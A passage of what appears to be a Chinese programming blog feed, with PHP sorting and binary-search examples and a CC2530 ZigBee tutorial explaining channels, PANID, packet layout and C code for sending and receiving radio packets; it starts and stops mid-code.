$arr[$i];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $right[] = $arr[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $left = quick_sort($left);<span class="comment">//递归</span></span><br><span class="line">    $right = quick_sort($right);<span class="comment">//递归</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array_merge($left,(<span class="keyword">array</span>)$arr[<span class="number">0</span>],$right);<span class="comment">//合并数组，注意这里元素必须全是数组才能进行操作，$arr[0]为元素，所以需要强制转换成数组，或者用array($arr[0])也可以</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r(quick_sort($arr));</span><br></pre></td></tr></table></figure><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge_sort</span><span class="params">($arr)</span></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    <span class="keyword">if</span>($len &lt;= <span class="number">1</span>) <span class="keyword">return</span> $arr;</span><br><span class="line">    $a  = floor($len / <span class="number">2</span>);<span class="comment">//舍去法取整</span></span><br><span class="line">    $left = array_slice($arr,<span class="number">0</span>,$a);<span class="comment">//array_slice从数组中取出一段序列</span></span><br><span class="line">    $right = array_slice($arr,$a);</span><br><span class="line">    $left = merge_sort($left);<span class="comment">//递归</span></span><br><span class="line">    $right = merge_sort($right);<span class="comment">//递归</span></span><br><span class="line">    $m = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">while</span>(count($left) &amp;&amp; count($right)) &#123;<span class="comment">//当有一边为0则结束返回</span></span><br><span class="line">        $m[] = $left[<span class="number">0</span>] &lt; $right[<span class="number">0</span>] ? array_shift($left) : array_shift($right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array_merge($m,$left,$right);<span class="comment">//后两个数组的放置对结果没影响</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r(merge_sort($arr));</span><br></pre></td></tr></table></figure><h3 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h3><p>这里有一种数组遍历查找就没写了</p><h4 id="二分法查找"><a href="#二分法查找" class="headerlink" title="二分法查找"></a>二分法查找</h4><p>注：二分法查找前要求数列是已经排好序了的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($arr,$num)</span></span>&#123;</span><br><span class="line">    $left = <span class="number">0</span>;</span><br><span class="line">    $right = count($arr);</span><br><span class="line">    <span class="keyword">while</span>($left &lt;= $right)&#123;</span><br><span class="line">        $middle = floor(($left + $right) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>($arr[$middle] == $num)&#123;</span><br><span class="line">            <span class="keyword">return</span> $arr[$middle];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($arr[$middle] &gt; $num)&#123;</span><br><span class="line">            $right = $middle - <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $left = $middle + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">print_r(check($arr,<span class="number">11</span>));</span><br></pre></td></tr></table></figure><p>这个方法在查找的时候如果要查的数据不在数组里就会报下面的注意事项（在的话不会报错），返回的结果<code>false</code>还是有的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Notice:  Undefined offset: 9 in C:\xxx\test.php on line 7</span><br><span class="line">Notice:  Undefined offset: 9 in C:\xxx\test.php on line 10</span><br></pre></td></tr></table></figure><p>原因还没找到，如果有大佬知道的话欢迎留言指出，wtcl -_-，没有的话坑先留着后面再填</p><h4 id="二分归并法查找"><a href="#二分归并法查找" class="headerlink" title="二分归并法查找"></a>二分归并法查找</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($arr,$num)</span></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    $a = floor($len / <span class="number">2</span>);</span><br><span class="line">    $left = array_slice($arr,<span class="number">0</span>,$a);</span><br><span class="line">    $right = array_slice($arr,$a);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(count($left) &amp;&amp; count($right))&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[$a] === $num )&#123;</span><br><span class="line">            <span class="keyword">return</span> $arr[$a];</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($arr[$a] &gt; $num)&#123;</span><br><span class="line">            <span class="keyword">return</span> check($left,$num);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> check($right,$num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">print_r(check($arr,<span class="number">8</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBee无线通信数据传输</title>
      <link href="/2020/02/11/ZigBee%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/"/>
      <url>/2020/02/11/ZigBee%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Zigbee无线通信，需要高频的载波来提供发射效率，Zigbee模块之间要可以正常的收发，接收模块必须把接收频率设置和发射模块的载波频率一致。</p></li><li><p>Zigbee有27个载波可以进行通信，载波叫做信道（无线通信的通道）。这些载波的频率落在某些频率区段，我们把这些区段叫做频段。TI的所有支持Zigbee底层协议的芯片只能在2.4G频段的16个信道里进行通信。即：</p><blockquote><p>11  2405M</p><p>12  2410M</p><p>……</p><p>26  2480M</p></blockquote></li><li><p>在Zigbee无线局域网里，每一模块都一个在该网络里唯一的2个字节的地址，这个地址叫做网络地址，网络短地址。</p></li><li><p>PANID这是一个2个字节的编码，用来区别不同的Zigbee无线局域网，个域网ID.</p></li><li><p>无线数据包的内容</p><blockquote><p>#define SENDVAL 5<br>char SendPacket[]={0x0C,0x61,0x88,0x00,0x07,0x20,0xEF,0xBE,0x20,0x50,SENDVAL};<br>//第一个字节0x0C含义，这个自己后面还有12个字节要发送<br>//第5 6个字节表示的是PANID<br>//第7 8个字节是无线模块目标设备的网络地址 0xBEEF<br>//第9 10就是本地模块的网络地址<br>//11 个字节是我们有用的数据<br>// CRC码 12 13个字节 是硬件自动追加</p></blockquote></li></ol><p>实验代码：</p><p>按钮控制数码管的数字显示变化</p><p>发送：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SENDVAL 5</span></span><br><span class="line"><span class="keyword">char</span> SendPacket[]=&#123;<span class="number">0x0c</span>,<span class="number">0x61</span>,<span class="number">0x88</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x20</span>,<span class="number">0xEF</span>,<span class="number">0xBE</span>,<span class="number">0x20</span>,<span class="number">0x50</span>,SENDVAL&#125;;</span><br><span class="line"><span class="comment">//第一个字节0x0C含义，这个自己后面还有12个字节要发送</span></span><br><span class="line"><span class="comment">//第5 6个字节表示的是PANID</span></span><br><span class="line"><span class="comment">//第7 8个字节是无线模块目标设备的网络地址 0xBEEF</span></span><br><span class="line"><span class="comment">//第9 10就是本地模块的网络地址</span></span><br><span class="line"><span class="comment">//11 个字节是我们有用的数据</span></span><br><span class="line"><span class="comment">// CRC码 12 13个字节 是硬件自动追加</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delay</span><span class="params">()</span>  <span class="comment">//延时函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y,x;</span><br><span class="line">    <span class="keyword">for</span>(y=<span class="number">1000</span>;y&gt;<span class="number">0</span>;y--)</span><br><span class="line">      <span class="keyword">for</span>(x=<span class="number">30</span>;x&gt;<span class="number">0</span>;x--);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init32M</span><span class="params">()</span>  <span class="comment">//设置为32M晶振</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br><span class="line">   <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br><span class="line">   Delay();</span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br><span class="line">   <span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">KeysIntCfg</span><span class="params">()</span>  <span class="comment">//设置开关中断</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//Key3  Key4   Key5</span></span><br><span class="line">     </span><br><span class="line">     IEN2|=<span class="number">0x10</span>;<span class="comment">//开P1IE组中断</span></span><br><span class="line">     P1IEN|=<span class="number">0x02</span>;<span class="comment">//开Key3组内中断</span></span><br><span class="line">     PICTL|=<span class="number">0x02</span>;<span class="comment">//设置P1_1为下降沿 </span></span><br><span class="line">     EA=<span class="number">1</span>;      <span class="comment">//开总中断</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">halRfInit</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    FRMCTRL0 |= <span class="number">0x60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Recommended RX settings  </span></span><br><span class="line">    TXFILTCFG = <span class="number">0x09</span>;</span><br><span class="line">    AGCCTRL1 = <span class="number">0x15</span>;</span><br><span class="line">    FSCAL1 = <span class="number">0x00</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// enable RXPKTDONE interrupt  </span></span><br><span class="line">    RFIRQM0 |= <span class="number">0x40</span>;<span class="comment">//把射频接收中断打开</span></span><br><span class="line">    <span class="comment">// enable general RF interrupts</span></span><br><span class="line">    IEN2 |= <span class="number">0x01</span>;</span><br><span class="line">    </span><br><span class="line">    FREQCTRL =(<span class="number">11</span>+(<span class="number">25</span><span class="number">-11</span>)*<span class="number">5</span>);<span class="comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);   </span></span><br><span class="line">                     <span class="comment">//设置载波为2475M</span></span><br><span class="line">    PAN_ID0=<span class="number">0x07</span>;</span><br><span class="line">    PAN_ID1=<span class="number">0x20</span>; <span class="comment">//0x2007   </span></span><br><span class="line"><span class="comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RFSend</span><span class="params">(<span class="keyword">char</span> *pstr,<span class="keyword">char</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i;</span><br><span class="line">    RFST = <span class="number">0xEC</span>; <span class="comment">//确保接收是空的</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>; <span class="comment">//清接收标志位</span></span><br><span class="line">    <span class="keyword">while</span> (FSMSTAT1 &amp; <span class="number">0x22</span>);<span class="comment">//等待射频发送准备好</span></span><br><span class="line">    RFST = <span class="number">0xEE</span>;<span class="comment">//确保发送队列是空</span></span><br><span class="line">    RFIRQF1 &amp;= ~<span class="number">0x02</span>;<span class="comment">//清发送标志位</span></span><br><span class="line"><span class="comment">//为数据发送做好准备工作</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">       RFD=pstr[i];</span><br><span class="line">    &#125;  <span class="comment">//循环的作用是把我们要发送的数据全部压到发送缓冲区里面</span></span><br><span class="line">    </span><br><span class="line">    RFST = <span class="number">0xE9</span>; <span class="comment">//这个寄存器一旦被设置为0xE9,发送缓冲区的数据就被发送出去</span></span><br><span class="line">    <span class="keyword">while</span>(!(RFIRQF1 &amp; <span class="number">0x02</span>) );<span class="comment">//等待发送完成</span></span><br><span class="line">    RFIRQF1 = ~<span class="number">0x02</span>;<span class="comment">//清发送完成标志</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   LS164_Cfg();<span class="comment">//74LS164控制数码管的初始化</span></span><br><span class="line">   Init32M(); <span class="comment">//主时钟晶振工作在32M </span></span><br><span class="line">   KeysIntCfg(); </span><br><span class="line">   </span><br><span class="line">   halRfInit();<span class="comment">//无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID</span></span><br><span class="line">   </span><br><span class="line">  SHORT_ADDR0=<span class="number">0x50</span>;</span><br><span class="line">  SHORT_ADDR1=<span class="number">0x20</span>;<span class="comment">//设置本模块地址  设置本模块的网络地址0x2050</span></span><br><span class="line">  <span class="comment">//大小端模式问题，</span></span><br><span class="line">  </span><br><span class="line">    LS164_BYTE(<span class="number">1</span>); </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=P1INT_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">Key3_ISR</span><span class="params">()</span> <span class="comment">//P1_1</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="number">0x02</span> &amp; P1IFG)</span><br><span class="line">     &#123;</span><br><span class="line">         Delay();</span><br><span class="line">         <span class="keyword">if</span>(<span class="number">0</span>==P1_1)</span><br><span class="line">         &#123;</span><br><span class="line">           P1DIR |=<span class="number">0X01</span>;</span><br><span class="line">           P1_0 ^=<span class="number">1</span>;</span><br><span class="line">           RFSend(SendPacket,<span class="number">11</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     P1IFG=<span class="number">0</span>;</span><br><span class="line">     P1IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=RF_VECTOR</span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">RF_IRQ</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行</span></span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( RFIRQF0 &amp; <span class="number">0x40</span> )</span><br><span class="line">    &#123;            </span><br><span class="line">        RFIRQF0&amp;= ~<span class="number">0x40</span>;   <span class="comment">// Clear RXPKTDONE interrupt</span></span><br><span class="line">    &#125;</span><br><span class="line">    S1CON= <span class="number">0</span>;   <span class="comment">// Clear general RF interrupt flag</span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y,x;</span><br><span class="line">    <span class="keyword">for</span>(y=<span class="number">1000</span>;y&gt;<span class="number">0</span>;y--)</span><br><span class="line">      <span class="keyword">for</span>(x=<span class="number">30</span>;x&gt;<span class="number">0</span>;x--);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init32M</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br><span class="line">   <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br><span class="line">   Delay();</span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br><span class="line">   <span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Uart0_Cfg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   PERCFG &amp;=<span class="number">0xFE</span>;<span class="comment">//把这个寄存器的第零位强行清零  1111 1110 </span></span><br><span class="line">   <span class="comment">//就是把串口0的脚位置配置在备用位置1 即P0_2  P0_3</span></span><br><span class="line">   </span><br><span class="line">   P0SEL  |=<span class="number">0x0C</span>;<span class="comment">//让P0_2  P0_3这两个脚工作在片上外设模式,而不是普通IO口       0000 1100</span></span><br><span class="line">   </span><br><span class="line">   U0CSR |=<span class="number">0xC0</span>;</span><br><span class="line">   U0UCR =<span class="number">0</span>; <span class="comment">//串口0 典型的串口配置  校验位 停止位之类的东西</span></span><br><span class="line">   </span><br><span class="line">   U0GCR =<span class="number">11</span>;</span><br><span class="line">   U0BAUD =<span class="number">216</span>;<span class="comment">//就是重官方数据手册中波特率表格中参照115200时的 配置值，前提是系统时钟在32M</span></span><br><span class="line">   </span><br><span class="line">   IEN0 |=<span class="number">0x04</span>; <span class="comment">//开接收数据的中断  0000 0100</span></span><br><span class="line">   EA=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Uart0SendByte</span><span class="params">(<span class="keyword">char</span> SendByte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    U0DBUF=SendByte;  <span class="comment">//把我们收到的数据通过串口再返回发出去</span></span><br><span class="line">    <span class="keyword">while</span>(UTX0IF==<span class="number">0</span>);</span><br><span class="line">    UTX0IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">halRfInit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EA=<span class="number">0</span>;</span><br><span class="line">    FRMCTRL0 |= <span class="number">0x60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Recommended RX settings  </span></span><br><span class="line">    TXFILTCFG = <span class="number">0x09</span>;</span><br><span class="line">    AGCCTRL1 = <span class="number">0x15</span>;</span><br><span class="line">    FSCAL1 = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">// enable RXPKTDONE interrupt  </span></span><br><span class="line">    RFIRQM0 |= <span class="number">0x40</span>;</span><br><span class="line">    <span class="comment">// enable general RF interrupts</span></span><br><span class="line">    IEN2 |= <span class="number">0x01</span>;</span><br><span class="line">    </span><br><span class="line">    FREQCTRL =(<span class="number">11</span>+(<span class="number">25</span><span class="number">-11</span>)*<span class="number">5</span>);<span class="comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);    </span></span><br><span class="line">    PAN_ID0=<span class="number">0x07</span>;</span><br><span class="line">    PAN_ID1=<span class="number">0x20</span>;    </span><br><span class="line"><span class="comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span></span><br><span class="line">    RFST = <span class="number">0xEC</span>;<span class="comment">//清接收缓冲器</span></span><br><span class="line">    RFST = <span class="number">0xE3</span>;<span class="comment">//开启接收使能 </span></span><br><span class="line">    EA=<span class="number">1</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 